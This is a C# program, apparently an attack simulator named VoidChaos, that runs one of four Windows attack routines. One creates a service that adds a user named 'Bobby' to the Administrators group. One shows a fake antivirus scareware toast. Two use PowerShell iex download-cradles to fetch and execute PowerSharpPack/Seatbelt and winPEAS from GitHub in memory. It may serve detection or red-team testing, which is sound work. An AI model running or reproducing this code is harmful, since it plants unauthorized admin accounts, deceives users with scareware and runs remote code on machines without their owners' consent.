using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using Microsoft.Toolkit.Uwp.Notifications;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;

namespace VoidChaos
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int funIndex;
            if ( args.Length > 0 && args[0] != null )
            {
                funIndex = int.Parse(args[0]);
            } else
            {
                funIndex = random.Next(0, 4);
            }
            switch (funIndex)
            {
                case 0:
                    badSvc();
                    break;
                case 1:
                    yoToast();
                    break;
                case 2:
                    pspAMSI();
                    break;
                case 3:
                    peas();
                    break;
            }
        }

        public static void badSvc()
        {
            string addcmd = $"\"net localgroup Administrators Bobby /add\"";
            string[] lpecmd = { "create", "bvSyncService", "displayName=", "bvSyncService", "binPath=", addcmd, "start=", "auto" };
            RunCmd(process: "sc.exe", args: lpecmd, true, false);
        }

        public static void yoToast()
        {
            new ToastContentBuilder()
                .AddArgument("action", "viewConversation")
                .AddArgument("conversationId", 9813)
                .AddText("Please update your AntiVirus!!!")
                .AddText("Your system is unsecure and your files are at risk!")
                .AddInlineImage(new Uri("https://beaverpro.sketchybins.com/infected.jpg"))
                .AddButton(new ToastButton()
                    .SetContent("Scan Now")
                    .AddArgument("action", "scannow")
                    .SetBackgroundActivation())
                .AddButton(new ToastButton()
                    .SetContent("Blow shit up")
                    .AddArgument("action", "kaboom")
                    .SetBackgroundActivation())
                .Show();
        }

        public static void pspAMSI()
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            string cmd = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1');PowerSharpPack -seatbelt -Command \"AMSIProviders\"";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }

        public static void peas()
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;
            string cmd = "iex(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1');";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }

        private static void RunCmd(string process, string[] args, bool admin, bool shell)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{process}\"",
                Arguments = string.Join(" ", args),
                UseShellExecute = shell
            };
            if (admin)
            {
                startInfo.Verb = "runas";
            }
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }
    }
}
